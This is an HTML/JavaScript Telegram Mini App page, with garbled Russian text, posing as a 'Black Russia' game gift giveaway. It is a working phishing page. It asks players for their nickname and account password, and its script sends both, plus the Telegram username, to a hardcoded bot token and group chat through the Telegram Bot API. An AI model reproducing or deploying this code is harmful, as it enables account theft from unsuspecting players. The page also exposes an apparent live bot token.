<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Black Russia | –ü–æ–¥–∞—Ä–∫–∏</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #121212;
            color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        h1 {
            color: #ffcc00;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #444;
            border-radius: 5px;
            color: white;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #ffcc00;
            color: black;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .error {
            color: red;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Black Russia –ü–æ–¥–∞—Ä–∫–∏</h1>
        <form id="giftForm">
            <div class="form-group">
                <label for="server">–°–µ—Ä–≤–µ—Ä:</label>
                <select id="server" required>
                    <option value="" disabled selected>‚Äî –í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä ‚Äî</option>
                    <option value="Server 1">Server 1</option>
                    <option value="Server 2">Server 2</option>
                    <option value="Server 3">Server 3</option>
                </select>
            </div>
            <div class="form-group">
                <label for="nickname">–ù–∏–∫–Ω–µ–π–º (—Ñ–æ—Ä–º–∞—Ç: Nick_Name):</label>
                <input type="text" id="nickname" placeholder="Example_Player" required>
                <div class="error" id="nickError">–§–æ—Ä–º–∞—Ç: —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã –∏ –æ–¥–Ω–æ –ø–æ–¥—á—ë—Ä–∫–∏–≤–∞–Ω–∏–µ (Example_Player)</div>
            </div>
            <div class="form-group">
                <label for="password">–ü–∞—Ä–æ–ª—å:</label>
                <input type="password" id="password" placeholder="–í–∞—à –ø–∞—Ä–æ–ª—å" required>
            </div>
            <button type="submit">–ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
        </form>
    </div>

    <script>
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.expand(); // –†–∞–∑–≤–µ—Ä–Ω—É—Ç—å Mini App –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
        document.getElementById('giftForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const server = document.getElementById('server').value;
            const nickname = document.getElementById('nickname').value;
            const password = document.getElementById('password').value;

            // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –Ω–∏–∫–Ω–µ–π–º–∞
            if (!/^[A-Za-z]+_[A-Za-z]+$/.test(nickname)) {
                document.getElementById('nickError').style.display = 'block';
                return;
            }

            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –≥—Ä—É–ø–ø—É
            const message = `üéÅ –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∞—Ä–æ–∫!\n\n` +
                           `üéÆ –°–µ—Ä–≤–µ—Ä: ${server}\n` +
                           `üÜî –ù–∏–∫–Ω–µ–π–º: ${nickname}\n` +
                           `üîë –ü–∞—Ä–æ–ª—å: ${password}\n\n` +
                           `–û—Ç: @${tg.initDataUnsafe.user?.username || '–∞–Ω–æ–Ω–∏–º'}`;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É —á–µ—Ä–µ–∑ Telegram Bot API
            const botToken = '7808613132:AAED4eckVrpvNo9mraL3LcOSgzrnUCXbvQI'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω
            const groupChatId = '-4927394143'; // ID –≥—Ä—É–ø–ø–æ–≤–æ–≥–æ —á–∞—Ç–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, -100123456789)

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${groupChatId}&text=${encodeURIComponent(message)}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        tg.showAlert("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ –≥—Ä—É–ø–ø—É!");
                        tg.close();
                    } else {
                        tg.showAlert("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.");
                    }
                })
                .catch(error => {
                    console.error("–û—à–∏–±–∫–∞:", error);
                    tg.showAlert("‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç.");
                });
        });
    </script>
</body>
</html>
